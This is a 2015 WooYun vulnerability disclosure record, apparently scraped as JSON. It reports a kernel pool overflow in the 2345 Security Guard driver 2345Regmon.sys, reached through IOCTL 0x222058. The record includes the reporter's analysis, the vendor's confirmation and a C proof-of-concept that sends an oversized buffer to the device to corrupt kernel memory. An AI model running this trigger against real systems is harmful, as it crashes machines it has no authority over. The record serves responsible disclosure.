{"id": 37488, "wybug_id": "wooyun-2015-099569", "wybug_title": "2345安全卫士驱动内存破坏", "wybug_corp": "2345网址导航", "wybug_author": "小马宝利", "wybug_date": "2015-03-10 12:22", "wybug_open_date": "2015-06-09 17:12", "wybug_type": "拒绝服务", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-14：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-09：\t细节向公众公开  简要描述： 2345安全卫士某驱动存在内存破坏型bug。 详细说明：  2345Regmon.sys中ControlCode为0x222058的处理逻辑中存在一个内核paged pool溢出。这个ControlCode的处理逻辑中存在一个将参数中的ansi字符串转存到内核申请的内存中的过程。处理流程如下：首先将InputBuffer中的某些部分作为字符串创建AnsiString。然后调用一个处理函数，就是这个函数中触发了漏洞。\n\n可以看出VulFunc函数接受了3个参数，分别是[InBuffer+0x8], 0, 一个从Inbuffer中转换过来的AnsiString。下面分析VulFunc函数，\n\n函数首先调用AllocSome申请了两段内存。\n\n申请了两块固定大小的内存，分别为0x48c字节的Buf1和0x258字节的Buf2。Buf2存放在[Buf1+0x18]处。然后将参数3转换成UnicodeString。\n\n用参数3转换的UnicodeString的长度和指针填充了Buf1中的部分域，然后由于参数2为0，所以直接跳转到loc_1f56a执行，调用VulFunc2。然后VulFunc2中又调用了VulFunc3最终调用了导致这次溢出的罪魁祸首vulTriger\n\n\n\n这里我要说一下。。我是第一次调这种类型的东西，这个溢出位置是我在调试出出错的池是Buf2所在的池后用!pool 调用一个函数就测试一下pool是否损坏了。一点一点查出来了。不知道有没有什么更简单的办法。仔细观察一下vulTriger其实是一个字符串拷贝，将上面提到的由inBuffer中转换来的UnicodeString的字符串拷贝到Buf2中。就是这个拷贝操作溢出了，BUF2是固定长度的但是UnicodeString没有限制长度，超出了BUF2的长度。另外。其实不少地方都没判断好用户层发送过来的数据长度(或者偏移？？)，只不过别的可能是越界读。我是菜鸟就不探究具体能不能利用了。就酱。。有点晚了。VulFunc3函数里其实我没仔细分析。具体的长度和目的缓冲区好像还有个计算过程。不过应该没啥问题铁定是这能溢出。实测结果就是给BUF2拷贝7XXX个字符。   漏洞证明：  \nvoid PocRegMon(DWORD controlCode){\tchar strCode[1024];\tHANDLE hDev = OpenDevice(_T(\"\\\\\\\\.\\\\2345RegMon\"));\tif (hDev == INVALID_HANDLE_VALUE) {\t\tprintf(\"[-] Open device failed!gle:%d\\n\", GetLastError());\t\treturn;\t}\tchar buffer1[0x10000] = { 0 };\tchar buffer2[1024] = { 0 };\tmemset(buffer1, 0xcc, sizeof(buffer1));\tbuffer1[2] = 0x10;\tbuffer1[3] = 0;\tbuffer1[0] = 0;\tbuffer1[1] = 0;\tbuffer1[0x34] = 0x1c;\tbuffer1[0x32] = 0xff;\tbuffer1[0x33] = 0xff;\tbuffer1[0x30] = 0xff;\tbuffer1[0x31] = 0xff;\twsprintfA(strCode, \"%x\\n\", controlCode);\tOutputDebugStringA(strCode);\tprintf(strCode);\tint ret = SendMessageToDev(hDev, controlCode, (BYTE *)buffer1, 0x10000, (BYTE*)buffer2, 0x100);\tif (ret < 0) {\t\tprintf(\"[-]Control device failed, gle:%d.\\n\", GetLastError());\t\treturn;\t}\tCloseDevice(hDev);\tprintf(\"[*]Ok!\\n\");\treturn;}int _tmain(int argc, _TCHAR* argv[]){\tPocRegMon(0x222058);\treturn 0;}\n   修复方案：  做好判读。。   版权声明：转载请注明来源 小马宝利@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2015-03-11 17:10 厂商回复： 已确认，漏洞我们会尽快修复，感谢您对2345的关注 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}